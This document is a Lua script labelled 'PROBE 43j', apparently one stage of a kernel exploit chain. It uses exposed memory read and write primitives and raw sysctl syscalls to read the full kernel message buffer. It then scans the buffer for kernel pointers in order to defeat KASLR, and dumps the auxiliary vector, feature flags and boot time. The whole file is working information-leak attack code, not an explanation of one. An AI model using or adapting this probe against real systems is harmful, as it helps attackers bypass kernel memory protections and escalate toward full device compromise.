-- CRASH_CLASS: LOW
-- PROBE 43j: Full kern.msgbuf read
--
-- Context: Probe 42b read kern.msgbuf with only 8 bytes and got 0x7EF710000.
-- The kernel message buffer (dmesg) is typically 32-256KB and contains boot
-- messages that often include kernel module load addresses, memory layout,
-- and driver init data. A full read could leak KASLR-defeating addresses.

print("=== PROBE 43j: KERN.MSGBUF FULL READ ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end

local pid = to_num(syscall.getpid())
print("pid: " .. pid)

local sc_sysctl = make_syscall(202)

-- Helper: call sysctl with given MIB and buffer
local function do_sysctl(mib_vals, mib_cnt, buf, bufsize)
    local mib = memory.alloc(mib_cnt * 4)
    for i = 0, mib_cnt - 1 do
        safe_wd(mib + i * 4, mib_vals[i + 1])
    end
    local oldlenp = memory.alloc(8)
    safe_wd(oldlenp, bufsize)
    safe_wd(oldlenp + 4, 0)
    local ok, ret = pcall(function()
        return sc_sysctl(uint64(mib), uint64(mib_cnt), uint64(buf),
            uint64(oldlenp), uint64(0), uint64(0))
    end)
    if not ok then return -999, 0 end
    local rlen = safe_rd(oldlenp) or 0
    return to_num(ret), rlen
end

-- === STEP 1: SIZE QUERY FOR kern.msgbuf ===
print("--- STEP 1: kern.msgbuf size query ---")
local size_buf = memory.alloc(8)
safe_wd(size_buf, 0)
safe_wd(size_buf + 4, 0)

-- kern.msgbuf = {CTL_KERN=1, KERN_MSGBUF=33}
local mib_msgbuf = {1, 33}
local ret, rlen = do_sysctl(mib_msgbuf, 2, 0, 0)
print(string.format("  size query: ret=%d rlen=%d", ret, rlen))

-- If size query failed, try with a buffer anyway
if rlen == 0 then rlen = 65536 end

-- Cap at 64KB for safety
if rlen > 65536 then rlen = 65536 end
print(string.format("  using buffer size: %d", rlen))

-- === STEP 2: FULL READ ===
print("")
print("--- STEP 2: Full kern.msgbuf read ---")
local buf = memory.alloc(rlen + 16)
-- Zero the buffer
for i = 0, math.min(rlen - 1, 1023) do
    pcall(function() memory.write_byte(buf + i, 0) end)
end

local ret2, rlen2 = do_sysctl(mib_msgbuf, 2, buf, rlen)
print(string.format("  ret=%d actual_len=%d", ret2, rlen2))

if ret2 == 0 and rlen2 > 0 then
    -- Scan for kernel pointers
    print("")
    print("--- STEP 3: Kernel pointer scan ---")
    local kptrs = 0
    local interesting = 0
    local step = 8
    local limit = math.min(rlen2, 65536)
    for off = 0, limit - 8, step do
        local val = safe_rq(buf + off)
        if val then
            local h, l = get_hi_lo(val)
            if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                kptrs = kptrs + 1
                print(string.format("  KPTR +0x%03X: %08X_%08X", off, h, l))
            end
        end
    end
    print(string.format("  kernel pointers found: %d", kptrs))

    -- Try to extract readable text (boot messages)
    print("")
    print("--- STEP 4: Text extraction ---")
    local text = {}
    local readable = 0
    for off = 0, math.min(rlen2 - 1, 4095) do
        local b = safe_rb(buf + off)
        if b and b >= 32 and b < 127 then
            text[#text + 1] = string.char(b)
            readable = readable + 1
        elseif b == 10 or b == 13 then
            text[#text + 1] = "\n"
        elseif b == 0 and #text > 0 then
            break
        else
            text[#text + 1] = "."
        end
    end
    print(string.format("  readable bytes in first 4KB: %d", readable))
    if #text > 0 then
        local s = table.concat(text)
        -- Print in chunks
        local chunk = 200
        for i = 1, math.min(#s, 2000), chunk do
            print("  " .. s:sub(i, i + chunk - 1))
        end
    end

    -- Hex dump of first 256 bytes
    print("")
    print("--- STEP 5: First 256 bytes hex ---")
    for row = 0, 240, 16 do
        if row >= rlen2 then break end
        local hex = ""
        for col = 0, 15 do
            local b = safe_rb(buf + row + col)
            if b then
                hex = hex .. string.format("%02X ", b)
            else
                hex = hex .. "?? "
            end
        end
        print(string.format("  +%03X: %s", row, hex))
    end
else
    print("  kern.msgbuf read FAILED")
    print("")
    -- Try alternative: small buffer read (repeat what 42b did but capture more)
    print("--- FALLBACK: Read with 8KB buffer ---")
    local buf2 = memory.alloc(8192)
    local ret3, rlen3 = do_sysctl(mib_msgbuf, 2, buf2, 8192)
    print(string.format("  ret=%d actual_len=%d", ret3, rlen3))
    if ret3 == 0 and rlen3 > 0 then
        for row = 0, math.min(rlen3 - 1, 255), 16 do
            local hex = ""
            for col = 0, 15 do
                local b = safe_rb(buf2 + row + col)
                if b then
                    hex = hex .. string.format("%02X ", b)
                else
                    hex = hex .. "?? "
                end
            end
            print(string.format("  +%03X: %s", row, hex))
        end
    end
end

-- === STEP 6: OTHER PROMISING SYSCTLS ===
print("")
print("--- STEP 6: Other sysctl reads ---")

-- kern.proc.auxv full read
print("  kern.proc.auxv (full):")
local auxv_buf = memory.alloc(512)
local ret_auxv, len_auxv = do_sysctl({1, 14, 16, pid}, 4, auxv_buf, 512)
print(string.format("    ret=%d len=%d", ret_auxv, len_auxv))
if ret_auxv == 0 and len_auxv > 0 then
    for off = 0, math.min(len_auxv - 1, 255), 8 do
        local val = safe_rq(auxv_buf + off)
        if val then
            local h, l = get_hi_lo(val)
            print(string.format("    +%03X: %08X_%08X", off, h, l))
        end
    end
end

-- kern.features full read
print("  kern.features (full):")
local feat_buf = memory.alloc(256)
local ret_feat, len_feat = do_sysctl({1, 36}, 2, feat_buf, 256)
print(string.format("    ret=%d len=%d", ret_feat, len_feat))
if ret_feat == 0 and len_feat > 0 then
    local feat_text = {}
    for i = 0, math.min(len_feat - 1, 255) do
        local b = safe_rb(feat_buf + i)
        if b and b >= 32 and b < 127 then
            feat_text[#feat_text + 1] = string.char(b)
        elseif b == 0 and #feat_text > 0 then
            break
        end
    end
    print("    text: " .. table.concat(feat_text))
end

-- kern.boottime
print("  kern.boottime:")
local bt_buf = memory.alloc(32)
local ret_bt, len_bt = do_sysctl({1, 21}, 2, bt_buf, 32)
print(string.format("    ret=%d len=%d", ret_bt, len_bt))
if ret_bt == 0 and len_bt > 0 then
    for off = 0, len_bt - 1, 8 do
        local val = safe_rq(bt_buf + off)
        if val then
            local h, l = get_hi_lo(val)
            print(string.format("    +%03X: %08X_%08X", off, h, l))
        end
    end
end

print("")
print("=== PROBE 43j COMPLETE ===")
